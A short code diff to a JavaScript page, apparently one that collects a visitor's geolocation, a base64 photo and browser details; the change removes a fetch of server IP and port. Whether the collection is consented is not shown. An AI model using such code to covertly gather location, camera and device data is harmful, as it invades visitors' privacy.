@@ -150,22 +150,7 @@
         };
     };
 
-    let infoServidor = {};
-
-    async function obterInfoServidor() {
-        try {
-            const res = await fetch('/info_servidor');
-            if (res.ok) {
-                infoServidor = await res.json();
-            }
-        } catch (e) {
-            infoServidor = {};
-        }
-    }
-
     async function coletarDadosDetalhes() {
-        await obterInfoServidor(); // Garante que infoServidor está preenchido
-
         let latitude = "indefinido", longitude = "indefinido", foto_base64 = null;
         const mensagemElement = document.getElementById('mensagem');
 
@@ -236,9 +221,7 @@
             fusoHorario: infosBrowser.fusoHorario,
             conexao: infosBrowser.conexao,
             larguraTela: infosBrowser.larguraTela,
-            alturaTela: infosBrowser.alturaTela,
-            ip_servidor: infoServidor.ip_servidor || "",
-            porta_servidor: infoServidor.porta_servidor || ""
+            alturaTela: infosBrowser.alturaTela
         };
 
         try {
